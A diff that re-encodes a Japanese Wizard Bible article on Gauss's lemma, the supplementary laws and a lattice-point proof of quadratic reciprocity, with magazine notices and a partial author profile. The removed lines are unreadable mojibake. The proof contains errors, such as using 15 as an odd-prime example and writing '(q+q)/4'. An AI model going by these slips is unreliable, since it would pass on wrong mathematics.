-[�藝]�K�E�X�̕��
-p�F��f���Ar=(p-1)/2�A(a,p)=1�Ƃ���B
-���̂Ƃ��Aa��r�{�܂ł̔{������ׂ�B
-1a, 2a, �c, ra
-������mod p�̐�Βl�ŏ���]��a1, a2, �c, a_r�Ƃ���B
-���̐���̒��̕����̌���t�Ƃ���΁A(a/p)=(-1)^t�ł���B
+[定理]ガウスの補題
+p：奇素数、r=(p-1)/2、(a,p)=1とする。
+このとき、aのr倍までの倍数を並べる。
+1a, 2a, …, ra
+これらのmod pの絶対値最小剰余をa1, a2, …, a_rとする。
+この数列の中の負数の個数をtとすれば、(a/p)=(-1)^tである。
 
-�@��L�̕\�L�ł͐�Βl�ŏ���]�Ƃ������t���g���Ă��邪�A����1a, 2a, �c, 
-ra��p�Ŋ������]��̒���p/2���傫�����̌���t�ƌ��������邱�Ƃ��ł���B
+　上記の表記では絶対値最小剰余という言葉を使っているが、数列1a, 2a, …, 
+raをpで割った余りの中でp/2より大きい数の個数がtと言い換えることもできる。
 
-�@���̃K�E�X�̕��ɂ��āA��������ōl���Ă݂�B
+　このガウスの補題について、数直線上で考えてみる。
 
 http://s-akademeia.sakura.ne.jp/main/image9/gauss_hodai.jpg
 
-�@x��1����(p-1)/2�܂ł̂����ꂩ�̐��Ƃ���B�����a�{���āAmod p�����Δ�
-��A���͈�B�Ɋ܂܂��B���̂����A�͈�B�Ɋ܂܂�����t�Ƃ���ƁAp��@�Ƃ�
-��a�̕�����]�A����(a/p)��t�̋��Ɉˑ�����Ƃ������Ƃł���B
+　xは1から(p-1)/2までのいずれかの数とする。これをa倍して、mod pを取れば範
+囲Aか範囲Bに含まれる。このうち、範囲Bに含まれる個数をtとすると、pを法とす
+るaの平方剰余、即ち(a/p)はtの偶奇に依存するということである。
 
-[�ؖ�](a,p)=1�̂Ƃ��Aa��(p-1)/2�i=r�Ƃ����j�̔{�������B
+[証明](a,p)=1のとき、aの(p-1)/2個（=rとおく）の倍数を作る。
 
-1a, 2a, �c, ra		��(*)	�ia�͓Y�����ł͂Ȃ��B1a��1�~a�j
+1a, 2a, …, ra		←(*)	（aは添え字ではない。1a＝1×a）
 
-�@�����āA��΍ŏ���]��
+　そして、絶対最小剰余を
 
-a1, a2, �c, a_r		��(**)�@�i1,2,�c,r�͓Y�����j
+a1, a2, …, a_r		←(**)　（1,2,…,rは添え字）
 
-�Ƃ���B
+とする。
 
-�@(**)�́h��Βl�h�͂��ׂ�mod p�ňقȂ�B����������B
+　(**)の”絶対値”はすべてmod pで異なる。これを示す。
 
-(i)ai=aj�i1��i,j��r�Ai��j�j�Ɖ��肷��B
+(i)ai=aj（1≦i,j≦r、i≠j）と仮定する。
 
-ai��aj (mod p)
-a(i-j)��0 (mod p)
-i��j (mod p)�@�i��(a,p)=1���a�ŗ��ӂ��������j
-����Ɩ����B
+ai≡aj (mod p)
+a(i-j)≡0 (mod p)
+i≡j (mod p)　（∵(a,p)=1よりaで両辺を割った）
+仮定と矛盾。
 
-(ii)���ɁAai=-aj�i1��i,j��r�Ai��j�j�Ɖ��肷��B
+(ii)次に、ai=-aj（1≦i,j≦r、i≠j）と仮定する。
 
-ai��-aj (mod p)
-a(i+j)��0 (mod p)
-i+j��0 (mod p)�@�i��(a,p)=1���a�ŗ��ӂ��������j
-����Ar=(p-1)/2�ł������̂ŁAi+j=2r�ł������Ƃ��Ă���������p-1�ƈ�v�B
-����āAi+j��p-1�ł���Ai+j��p�ɂȂ�B
-i+j��0 (mod p)��i+j��p�͖��炩�ɖ����B
+ai≡-aj (mod p)
+a(i+j)≡0 (mod p)
+i+j≡0 (mod p)　（∵(a,p)=1よりaで両辺を割った）
+一方、r=(p-1)/2であったので、i+j=2rであったとしてもせいぜいp-1と一致。
+よって、i+j≦p-1であり、i+j＜pになる。
+i+j≡0 (mod p)とi+j＜pは明らかに矛盾。
 
-�@�ȏ��(i)(ii)���A(**)�́h��Βl�h�͂��ׂ�mod p�ňقȂ邱�Ƃ��킩��B
+　以上の(i)(ii)より、(**)の”絶対値”はすべてmod pで異なることがわかる。
 
-�@���ɁA(**)�̐���ɂ����镄���𖳎�����ƁA1,2,�c,r��1�ʂ茻���B�����
-�����B
+　次に、(**)の数列における符号を無視すると、1,2,…,rが1通り現れる。これを
+示す。
 
-�@(**)�̒��̕����̌���t�Ƃ���ƁAa1�~a2�~�c�~a_r=(-1)^t�Er!�@��(***)�����藧�B
+　(**)の中の負数の個数をtとすると、a1×a2×…×a_r=(-1)^t・r!　←(***)が成り立つ。
 
-�@�܂��A(*)���A(1a)(2a)�c(ra)=a^r�Er!�@��(****)�����藧�B
+　また、(*)より、(1a)(2a)…(ra)=a^r・r!　←(****)が成り立つ。
 
-�@mod p��(***)��(****)�͍����Ȃ̂ŁA�������藧�i�E�ӂɒ��ڂ����j�B
+　mod pで(***)と(****)は合同なので、次が成り立つ（右辺に注目した）。
 
-(-1)^t�Er!��a^r�Er! (mod p)
-(-1)^t��a^r�@�i��(r!,p)=1���A���ӂ���r!���������j
-(-1)^t��a^((p-1)/2)�@�i��r=(p-1)/2�j
-(-1)^t��(a/p)�@�i��I�C���[�K���j�@��
+(-1)^t・r!≡a^r・r! (mod p)
+(-1)^t≡a^r　（∵(r!,p)=1より、両辺からr!を割った）
+(-1)^t≡a^((p-1)/2)　（∵r=(p-1)/2）
+(-1)^t≡(a/p)　（∵オイラー規準）　□
 
 
-��0x03.) ��[�@��
+■0x03.) 補充法則
 
-�@������n�ɑ΂���(n/p)�����߂�Ƃ��́A���W�����h���L���͏�@�������̂ŁA
-n��f������������΂悢�B��������΁A(n/p)��(-1/p) or (2/p) or (��f��/p)
-�̐ςɋA�������B�܂�A(-1/p) or (2/p) or (��f��/p)��1��-1�����肷��
-����i�藝�j���K�v�ł���B
+　合成数nに対する(n/p)を求めるときは、ルジャンドル記号は乗法性を持つので、
+nを素因数分解すればよい。そうすれば、(n/p)は(-1/p) or (2/p) or (奇素数/p)
+の積に帰着される。つまり、(-1/p) or (2/p) or (奇素数/p)が1か-1か判定する
+道具（定理）が必要である。
 
-[�藝]��1��[�@��
-p�F��f���Ƃ���B
+[定理]第1補充法則
+p：奇素数とする。
 (-1/p)=(-1)^{(p-1)/2}
 
-[�ؖ�]�I�C���[�K���ł���(a/p)=a^{(p-1)/2}�ɁAa=-1�����B�@��
+[証明]オイラー規準である(a/p)=a^{(p-1)/2}に、a=-1を代入。　□
 
-[�ʏ�]�K�E�X�̕���a=-1�Ƃ��āAa�̔{������ׂ�B
+[別証]ガウスの補題でa=-1として、aの倍数を並べる。
 
--1,-2,�c,-r
+-1,-2,…,-r
 
-�@�����͂��ׂĐ�Βl�ŏ���]�ɂȂ��Ă���̂ŁA
+　これらはすべて絶対値最小剰余になっているので、
 
-(-1/p)=(-1)^t�@�ȁ@t=(p-1)/2�@��
+(-1/p)=(-1)^t　∧　t=(p-1)/2　□
 
-[�n]
-(-1/p)=1 �@�ip��1 (mod 4)�̂Ƃ��j
-�@�@�@ -1�@�ip��3 (mod 4)�̂Ƃ��j
+[系]
+(-1/p)=1 　（p≡1 (mod 4)のとき）
+　　　 -1　（p≡3 (mod 4)のとき）
 
-[�ؖ�]m����̂Ƃ��A4��@�Ƃ����m=4n�}1��2�p�^�[���ɂȂ�B
+[証明]mが奇数のとき、4を法とするとm=4n±1の2パターンになる。
 
-�E�um=4n+1�v�́u(m-1)/2=2n�v�́u(m-1)/2�F�����v
-�E�um=4n-1�v�́u(m-1)/2=2n-1�v�́u(m-1)/2�F��v
+・「m=4n+1」⇔「(m-1)/2=2n」⇔「(m-1)/2：偶数」
+・「m=4n-1」⇔「(m-1)/2=2n-1」⇔「(m-1)/2：奇数」
 
-�@p��1 (mod 4)�̂Ƃ��A(p-1)/2=�������A(-1)^{(p-1)/2}�͂���1�ɂȂ�B
-�@����Ap��3 (mod 4)�̂Ƃ��A(p-1)/2=����A(-1)^{(p-1)/2}�͂���-1��
-�Ȃ�B�@��
+　p≡1 (mod 4)のとき、(p-1)/2=偶数より、(-1)^{(p-1)/2}はいつも1になる。
+　一方、p≡3 (mod 4)のとき、(p-1)/2=奇数より、(-1)^{(p-1)/2}はいつも-1に
+なる。　□
 
-[�藝]��2��[�@��
-p�F��f���Ƃ���B
+[定理]第2補充法則
+p：奇素数とする。
 (2/p)=(-1)^{(p^2-1)/8}
 
-�@���̑�2��[�@���ɂ��A�Ⴆ��(2/13)��e�Ղɉ������Ƃ��ł���B
+　この第2補充法則により、例えば(2/13)を容易に解くことができる。
 
-�@p=13�̂Ƃ��ł���A(p^2-1)/8=(169-1)/8=168/8=21=�
+　p=13のときであり、(p^2-1)/8=(169-1)/8=168/8=21=奇数
 
-�@����āA(2/13)=(-1)^(�)=-1�ɂȂ�B
+　よって、(2/13)=(-1)^(奇数)=-1になる。
 
-[�ؖ�]a=2�Ƃ��ăK�E�X�̕���K�p����B
+[証明]a=2としてガウスの補題を適用する。
 
-�@p-1�͋����Ȃ̂ŁAp-1��2�Ŋ����B
-�@���̌��ʂ�r=(p-1)/2�̋��ɂ���āA�ꍇ����������B�����ł͒��ϓI�ɗ���
-�ł���悤��p����̓I�Ȓl�Ŋώ@���Ă݂�B
+　p-1は偶数なので、p-1は2で割れる。
+　その結果のr=(p-1)/2の偶奇によって、場合分けをする。ここでは直観的に理解
+できるようにpを具体的な値で観察してみる。
 
-[1]r�������̂Ƃ�
+[1]rが偶数のとき
 
-�E�Ⴆ�΁Ap=13�i8��@�Ƃ��ĂƂ�5�j�Ƃ���ƁAp/2=6.5�Ar=(p-1)/2=6��������
-�Ȃ�A1����6�܂ł̐��̔{���̐�������B
+・例えば、p=13（8を法としてとき5）とすると、p/2=6.5、r=(p-1)/2=6＝偶数と
+なり、1から6までの数の倍数の数列を作る。
 
-a�~1, a�~2, a�~3, a�~4, a�~5, a�~6	��6�̐��ō\�������B
+a×1, a×2, a×3, a×4, a×5, a×6	←6個の数で構成される。
 
-��a=2
+↓a=2
 
-2�~1, 2�~2, 2�~3, 2�~4, 2�~5, 2�~6
+2×1, 2×2, 2×3, 2×4, 2×5, 2×6
 
-��
+↓
 
 2, 4, 6, 8, 10, 12
 
-�@���̐���̒��ŁAp/2=6.5���傫�����̂̌���t=3�i=r/2=(p-1)/4�j�ł�
-��B
+　この数列の中で、p/2=6.5より大きいものの個数はt=3個（=r/2=(p-1)/4）であ
+る。
 
-�E�Ⴆ�΁Ap=17�i8��@�Ƃ��ĂƂ�1�j�Ƃ���ƁAp/2=8.5�Ar=8�������ƂȂ�A1��
-��8�܂ł̐��̔{���̐�������B
+・例えば、p=17（8を法としてとき1）とすると、p/2=8.5、r=8＝偶数となり、1か
+ら8までの数の倍数の数列を作る。
 
-a�~1, a�~2, a�~3, a�~4, a�~5, a�~6, a�~7, a�~8	��8�̐��ō\�������B
+a×1, a×2, a×3, a×4, a×5, a×6, a×7, a×8	←8個の数で構成される。
 
-��a=2
+↓a=2
 
-2�~1, 2�~2, 2�~3, 2�~4, 2�~5, 2�~6, 2�~7, 2�~8
+2×1, 2×2, 2×3, 2×4, 2×5, 2×6, 2×7, 2×8
 
-��
+↓
 
 2, 4, 6, 8, 10, 12, 14, 16
 
-�@���̐���̒��ŁAp/2=8.5���傫�����̂̌���t=4�i=r/2=(p-1)/4�j�ł�
-��B
+　この数列の中で、p/2=8.5より大きいものの個数はt=4個（=r/2=(p-1)/4）であ
+る。
 
-[2]r����̂Ƃ�
+[2]rが奇数のとき
 
-�E�Ⴆ�΁Ap=15�i8��@�Ƃ��ĂƂ�7�j�Ƃ���ƁAp/2=7.5�Ar=7����ƂȂ�A1��
-��7�܂ł̐��̔{���̐�������B
+・例えば、p=15（8を法としてとき7）とすると、p/2=7.5、r=7＝奇数となり、1か
+ら7までの数の倍数の数列を作る。
 
-a�~1, a�~2, a�~3, a�~4, a�~5, a�~6, a�~7	��7�̐��ō\�������B
+a×1, a×2, a×3, a×4, a×5, a×6, a×7	←7個の数で構成される。
 
-��a=2
+↓a=2
 
-2�~1, 2�~2, 2�~3, 2�~4, 2�~5, 2�~6, 2�~7
+2×1, 2×2, 2×3, 2×4, 2×5, 2×6, 2×7
 
-��
+↓
 
 2, 4, 6, 8, 10, 12, 14
 
-�@���̐���̒��ŁAp/2=7.5���傫�����̂̌���t=4�i=(r+1)/2=(p+1)/4�j
-�ł���B
+　この数列の中で、p/2=7.5より大きいものの個数はt=4個（=(r+1)/2=(p+1)/4）
+である。
 
-�E�Ⴆ�΁Ap=19�i8��@�Ƃ��ĂƂ�3�j�Ƃ���ƁAp/2=9.5�Ar=(p-1)/2=9�����
-�Ȃ�A1����9�܂ł̐��̔{���̐�������B
+・例えば、p=19（8を法としてとき3）とすると、p/2=9.5、r=(p-1)/2=9＝奇数と
+なり、1から9までの数の倍数の数列を作る。
 
-a�~1, a�~2, a�~3, a�~4, a�~5, a�~6, a�~7, a�~8, a�~9	��9�̐��ō\�������B
+a×1, a×2, a×3, a×4, a×5, a×6, a×7, a×8, a×9	←9個の数で構成される。
 
-��a=2
+↓a=2
 
-2�~1, 2�~2, 2�~3, 2�~4, 2�~5, 2�~6, 2�~7, 2�~8, 2�~9
+2×1, 2×2, 2×3, 2×4, 2×5, 2×6, 2×7, 2×8, 2×9
 
-��
+↓
 
 2, 4, 6, 8, 10, 12, 14, 16, 18
 
-�@���̐���̒��ŁAp/2=9.5���傫�����̂̌���t=5�i=(r+1)/2=(p+1)/4�j
-�ł���B
-�@�ȏ�̋c�_�͈�ʂɐ������邩��A�������藧�B
+　この数列の中で、p/2=9.5より大きいものの個数はt=5個（=(r+1)/2=(p+1)/4）
+である。
+　以上の議論は一般に成立するから、次が成り立つ。
 
-[1]�u(p-1)/2�F�����v�ˁu(p+1)/2�F��v�̂Ƃ��At1=(p-1)/4
-[2]�u(p-1)/2�F��v�̂Ƃ��At2=(p+1)/4
+[1]「(p-1)/2：偶数」⇒「(p+1)/2：奇数」のとき、t1=(p-1)/4
+[2]「(p-1)/2：奇数」のとき、t2=(p+1)/4
 
-�@���̂Ƃ��A���̂悤�Ȏ����l����B
+　このとき、次のような式を考える。
 
-[1]{(p+1)/2}�~t1=(p^2-1)/8
-[2]{(p-1)/2}�~t2=(p^2-1)/8
+[1]{(p+1)/2}×t1=(p^2-1)/8
+[2]{(p-1)/2}×t2=(p^2-1)/8
    ~~~~~~~~~
-     �
+     奇数
 
-�@������2�̎��̋���t1 or t2�̋��Ɉˑ�����B�Ȃ��Ȃ�΁A��~����
-�������A��~�����ł��邩��B
+　これらの2つの式の偶奇はt1 or t2の偶奇に依存する。なぜならば、奇数×偶数
+＝偶数、奇数×奇数＝奇数であるから。
 
-�@�䂦�ɁA(p^2-1)/8�͎咣�̎��ɂ�����E�ӂ�(-1)�̗ݏ�ɑΉ�����B�@��
+　ゆえに、(p^2-1)/8は主張の式における右辺の(-1)の累乗に対応する。　□
 
-[�n](2/p)=1   �ip��1 or 7 (mod 8)�̂Ƃ��j
-�@�@�@�@ = -1 �ip��3 or 5 (mod 8)�̂Ƃ��j
+[系](2/p)=1   （p≡1 or 7 (mod 8)のとき）
+　　　　 = -1 （p≡3 or 5 (mod 8)のとき）
 
-[�ؖ�]8��@�Ƃ���ƁA���m=8n�}1 or 8n�}5�iz��Z�j��4�p�^�[�������łȂ�B
+[証明]8を法とすると、奇数はm=8n±1 or 8n±5（z∈Z）の4パターンだけでなる。
 
-�Em=8n�}1�̂Ƃ��A(m^2-1)/8=8n^2�}2n������
-�Em=8n�}5�̂Ƃ��A(m^2-1)/8=8n^2�}10n+3���
+・m=8n±1のとき、(m^2-1)/8=8n^2±2n＝偶数
+・m=8n±5のとき、(m^2-1)/8=8n^2±10n+3＝奇数
 
-�@�Ƃ���ŁA��2��[�@����(2/p)=(-1)^{(p^2-1)/8}��1��-1���́A(p^2-1)/8�̋�
-��Ɉˑ�����Bp�͊�f���Am����Ȃ̂ŁA(p^2-1)/8�̋���(m^2-1)/8�̋��
-�ƈ�v����B�@��
+　ところで、第2補充法則の(2/p)=(-1)^{(p^2-1)/8}が1か-1かは、(p^2-1)/8の偶
+奇に依存する。pは奇素数、mが奇数なので、(p^2-1)/8の偶奇は(m^2-1)/8の偶奇
+と一致する。　□
 
-�@���̌n�֗̕������������Ă݂�B��2��[�@����(2/13)���v�Z����Ƃ��́A13^2
-�̌v�Z���K�v�ł������B�Ƃ��낪�A���̌n���g����p=13��5 (mod 8)���A������
-(2/13)=-1�Ƃ킩��B
+　この系の便利さを実感してみる。第2補充法則で(2/13)を計算するときは、13^2
+の計算が必要であった。ところが、この系を使えばp=13≡5 (mod 8)より、すぐに
+(2/13)=-1とわかる。
 
 
-��0x04.) ���ݖ@��
+■0x04.) 相互法則
 
-�@�c���(��f��/p)�𒲂ׂ�p�݂̂ł���B����́i������]�́j���ݖ@���ƌ�
-�΂��藝��p���邱�ƂŎ����ł���B���̑��ݖ@���͐����_�̂ЂƂ̎R���
-�����Ă���A���ݖ@�����o���_�Ƃ��ċߑ�̐����_���W�J���ꂽ�B
+　残りは(奇素数/p)を調べる術のみである。これは（平方剰余の）相互法則と呼
+ばれる定理を用いることで実現できる。この相互法則は整数論のひとつの山場と
+言われており、相互法則を出発点として近代の整数論が展開された。
 
-�@���̑��ݖ@���̓I�C���[�ɂ��A�[�I�Ɏ�����A���S�ȏؖ��̓K�E�X�ɂ����
-�^����ꂽ�B���ݖ@���̏ؖ��͂������񑶍݂��A�{1���ɂȂ��Ă���قǂł���B
-�����ł͊i�q�_�𗘗p����􉽓I�ȏؖ���p����B
+　この相互法則はオイラーにより帰納的に示され、完全な証明はガウスによって
+与えられた。相互法則の証明はたくさん存在し、本1冊になっているほどである。
+ここでは格子点を利用する幾何的な証明を用いる。
 
-�@����ł͂܂����ݖ@���̎咣���Љ��B
+　それではまず相互法則の主張を紹介する。
 
-[�藝]������]�̑��ݖ@��
-p,q�F���قȂ�
+[定理]平方剰余の相互法則
+p,q：相異なる奇数
 (p/q)(q/p)=(-1)^{(p-1)/2}{(q-1)/2}
 
-����͎��̂悤�ɂ�������������B
+これは次のようにも言い換えられる。
 
-(p/q)(q/p)=1�@ �ip��1 �� q��1 (mod 4))
-          =-1�@�ip��3 �� q��3 (mod 4))
+(p/q)(q/p)=1　 （p≡1 ∨ q≡1 (mod 4))
+          =-1　（p≡3 ∧ q≡3 (mod 4))
 
-�@�ؖ��ɓ���O�ɁA���̑��ݖ@�����g���΃��W�����h���L���̌v�Z���e�ՂɂȂ�
-���Ƃ��m�F����B
+　証明に入る前に、この相互法則を使えばルジャンドル記号の計算が容易になる
+ことを確認する。
 
 (15/71)
-=(3/71)(5/71)�@�i��15=3�E5�A��@���j
-=-(71/3)�E(71/5)
-�@�i�摊�ݖ@���{�u71,5�F�قȂ�f���A�f��71��3 (mod 4), 3��3 (4)�v���(3/71)=-(71/3)�A�u71,5�F�قȂ�f���A71��3 (mod 4), 5��1 (mod 4)�v���(5/71)=(71/5)�j
-=-(2/3)(1/5)�@�i��71��2 (mod 3)�A71��1 (mod 5)�j
-=-(-1)�E1�@�i���2��[�@���̌n�j
+=(3/71)(5/71)　（∵15=3・5、乗法性）
+=-(71/3)・(71/5)
+　（∵相互法則＋「71,5：異なる素数、素数71≡3 (mod 4), 3≡3 (4)」より(3/71)=-(71/3)、「71,5：異なる素数、71≡3 (mod 4), 5≡1 (mod 4)」より(5/71)=(71/5)）
+=-(2/3)(1/5)　（∵71≡2 (mod 3)、71≡1 (mod 5)）
+=-(-1)・1　（∵第2補充法則の系）
 =1
 
-[�ؖ�]�K�E�X�̕��(a/p)=(-1)^t�ɂ����āAa=q�Ƃ���B
+[証明]ガウスの補題(a/p)=(-1)^tにおいて、a=qとする。
 
-����{1�Eq, 2�Eq, �c, {(p-1)/2}q}
+数列{1・q, 2・q, …, {(p-1)/2}q}
 
-x��{1,2,�c,(p-1)/2}�Ƃ��Axq mod p��p/2�𖞂���x�̌���t�ɑΉ�����B
-����āAx�̋��킩��Ώ\���ł���B
+x∈{1,2,…,(p-1)/2}とし、xq mod p＞p/2を満たすxの個数がtに対応する。
+よって、xの偶奇がわかれば十分である。
 
-�uxq (mod p) �� p/2�v
-�́u�i(q/p)x�̕��������j��1/2�v�@��(*)
-�i��uxq mod p��p/2�v�́uxq=ap+r (a��Z,0��a��r) �� r��p/2�v�́ur/p=(q/p)x-ap �� r/p��1/2�v���j
+「xq (mod p) ＞ p/2」
+⇔「（(q/p)xの分数部分）＞1/2」　←(*)
+（∵「xq mod p＞p/2」⇔「xq=ap+r (a∈Z,0≦a＜r) ∧ r＞p/2」⇔「r/p=(q/p)x-ap ∧ r/p＞1/2」より）
 
-�����Ō��_O��D(p/2,q/2)��ʂ钼���iY=(q/p)X�j���Ay���̕�����1/2�������s��
-������������EF�Ƃ���B
-�eX�ɂ����Ē���Y=(q/p)X�Ɉ�ԋ߂��i�q�_�́AY�̏ォ���ɂ���B
-���������̊i�q�_�͕K��(q/p)X-(1/2)��(q/p)X+(1/2)�̊Ԃɑ��݂���B
+ここで原点OとD(p/2,q/2)を通る直線（Y=(q/p)X）を、y軸の方向に1/2だけ平行移
+動した直線をEFとする。
+各Xにおいて直線Y=(q/p)Xに一番近い格子点は、Yの上か下にある。
+しかもその格子点は必ず(q/p)X-(1/2)と(q/p)X+(1/2)の間に存在する。
 
 http://security2600.sakura.ne.jp/main2/image4/sougo.jpg
 
-X=x��0�`p/2�܂ő��点���Ƃ��ɁA�����̏�ɑ��݂����ԋ߂��i�q�_�̌���t1
-�Ƃ���Ǝ������藧�B
+X=xを0〜p/2まで走らせたときに、直線の上に存在する一番近い格子点の個数をt1
+とすると次が成り立つ。
 
 t1
-=�i(*)�𖞂���x�̌��j
-=#{x|x��{1,2,�c,(p-1)/2} �� xq (mod p) �� p/2}
-=��OEFD���̊i�q�_�̐�
+=（(*)を満たすxの個数）
+=#{x|x∈{1,2,…,(p-1)/2} ∧ xq (mod p) ＞ p/2}
+=□OEFD内の格子点の数
 
-���l�ɂ��āA�����̉��ɑ��݂����ԋ߂��i�q�_�̌���t2�Ƃ���Ǝ������藧
-�B
+同様にして、直線の下に存在する一番近い格子点の個数をt2とすると次が成り立
+つ。
 
 t2
-=#{y|y��{1,2,�c,(q-1)/2} �� yp (mod q) �� q/2}
-=��ODHG���̊i�q�_�̐�
+=#{y|y∈{1,2,…,(q-1)/2} ∧ yp (mod q) ＞ q/2}
+=□ODHG内の格子点の数
 
 t1+t2
-=��OEFD���̊i�q�_�̐��{��ODHG���̊i�q�_�̐�
-=��OEFD���̊i�q�_�̐��{��ODHG���̊i�q�_�̐��{��DFBH���̊i�q�_�̐�
-�@�i�恠DFBH���ɂ͕K���i�q�_�����݂��Ȃ��j
-=�Z�p�`OEFBHG
-=��OADC-��EFF'-��GHH'
-={(p-1)/2}{(q-1)/2}-2��EFF'
+=□OEFD内の格子点の数＋□ODHG内の格子点の数
+=□OEFD内の格子点の数＋□ODHG内の格子点の数＋□DFBH内の格子点の数
+　（∵□DFBH内には必ず格子点が存在しない）
+=六角形OEFBHG
+=□OADC-△EFF'-△GHH'
+={(p-1)/2}{(q-1)/2}-2△EFF'
 	            ~~~~~~~
-                     ����
+                     偶数
 
-����āA���̂悤�Ɏ咣�����藧�B
+よって、次のように主張が成り立つ。
 
 (q/p)(p/q)
 =(-1)^(t1+t2)
-=(-1)^[{(p-1)/2}{(q-1)/2}-2��EFF']
+=(-1)^[{(p-1)/2}{(q-1)/2}-2△EFF']
 =(-1)^{(p-1)/2}{(q-1)/2}
 
-����őO�����ؖ����ꂽ�B
+これで前半が証明された。
 
-���͌㔼�������B�Z�p�`OEFBHG�͓_M((p+1)/4,(q+q)/4)�œ_�Ώ̂ł���B
+次は後半を示す。六角形OEFBHGは点M((p+1)/4,(q+q)/4)で点対称である。
 
-[1](p+1)/4��������(q+1)/4�������A����p��-1��3 (mod 4)��q��3 (mod 4)�̂Ƃ�
+[1](p+1)/4が整数∧(q+1)/4が整数、即ちp≡-1≡3 (mod 4)∧q≡3 (mod 4)のとき
 
-�@���S�_M�͊i�q�_�ɂȂ邽��t1+t2�͊�ɂȂ�B����āA(q/p)(p/q)=-1
+　中心点Mは格子点になるためt1+t2は奇数になる。よって、(q/p)(p/q)=-1
 
-[2]M���i�q�_�łȂ���΁At1+t2�͋����ɂȂ�B����āA(q/p)(p/q)=1�@��
-
-
-��0x05.) �Ō��
-
-�@�O��ƍ���ŕ�����]�A���W�����h���L���A�K�E�X�̕⏕�藝�A��[�@���A��
-����]�̑��ݖ@���ɂ��ċ삯���ŏЉ���B���ɕ�����]�̑��ݖ@���͌�����
-�ɂ��������藝�Ȃ̂ŁA����������l�͐��w���ɎQ�Ƃ��Ă��炢�����B�w������
-�]�̑��ݖ@���\�K�E�X�̑S�ؖ��x�i���{�]�_�Ёj�Ƃ����{�ɂ́A�K�E�X��7�̏�
-�����Љ��Ă���B
-
-http://www.nippyo.co.jp/book/1249.html�i�c�O�Ȃ����Łj
-
-�@����̓��W�����h���L���̊g���o�[�W�����ł��郄�R�r�L�����`����B�ȒP
-�ɏЉ��ƁA���R�r�L���ɂ����Ă����W�����h���L���Ɠ��l�ɕ�[�@���E����
-�@�������藧���A������]�̌v�Z�ɂ����ĕ��q�̑f�����������s�v�ɂȂ�̂ł�
-��B
+[2]Mが格子点でなければ、t1+t2は偶数になる。よって、(q/p)(p/q)=1　□
 
 
+■0x05.) 最後に
 
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+　前回と今回で平方剰余、ルジャンドル記号、ガウスの補助定理、補充法則、平
+方剰余の相互法則について駆け足で紹介した。特に平方剰余の相互法則は見た目
+にも美しい定理なので、興味がある人は数学書に参照してもらいたい。『平方剰
+余の相互法則—ガウスの全証明』（日本評論社）という本には、ガウスの7つの証
+明が紹介されている。
 
- --- ��6��: ���m�点 ---
+http://www.nippyo.co.jp/book/1249.html（残念ながら絶版）
+
+　次回はルジャンドル記号の拡張バージョンであるヤコビ記号を定義する。簡単
+に紹介すると、ヤコビ記号においてもルジャンドル記号と同様に補充法則・相互
+法則が成り立ち、平方剰余の計算において分子の素因数分解が不要になるのであ
+る。
+
+
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-��Wizard Bible�ihttp://wizardbible.org/�j�ł͐����A���M���C�^�[���W����
-���܂��B
-�@�������e�̃e�[�}�͍L�`�ł́uunder ground�v�ł��B�Ⴆ�΃n�b�L���O��Z�L
-�����e�B����s�b�L���O�Ȃǂƕ��L�����e���l���Ă��܂��B�܂�����ȐE�Ƃ��
-���̉���Ȃǂł��\���܂���B
-�@��񂫂�ł��\���܂���B�܂��K������A�ڂ���`��������܂���̂ŁA�ł�
-��͈͂ō\���܂���B�C�y�ɐ��������Ă��������B
+ --- 第6章: お知らせ ---
 
-��Kenji Aiko����Q&A������Ă���܂����B���߂ĎQ������l�ł��킩��₷��
-������Ă��܂��̂ŁA�Q�l�ɂ��Ă��������B
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
 
 http://wizardbible.org/wbQandA.html
 
-��Wizard Bible�ɎQ����]�̕��͋C�y�Ƀ��[���iipusiron@gmail.com�j���������B
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-  ---- ��7��: ���҃v���t�B�[�� ---
+  ---- 第7章: 著者プロフィール ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-������
-��Job: �v���O���}�[
-��Web: http://guardian.jumperz.net/, http://www.jumperz.net/
-��Mail: anvil@jumperz.net
-��Comment:
-�@�{����Black Hat Japan 2008�̃��|�[�g���������肾�����̂ł����AIPU����
-���S���S�����Ă���WB44�̕�W���x���Ȃ�������BHJ2008�̋L����������т܂����B
-2�����O�̂��Ƃ͊o���Ă܂���B�����̂͂��ׂ�IPU�����ł��B�����̂͂���IP
-U�����ł��BFOX3!
+■金床
+●Job: プログラマー
+●Web: http://guardian.jumperz.net/, http://www.jumperz.net/
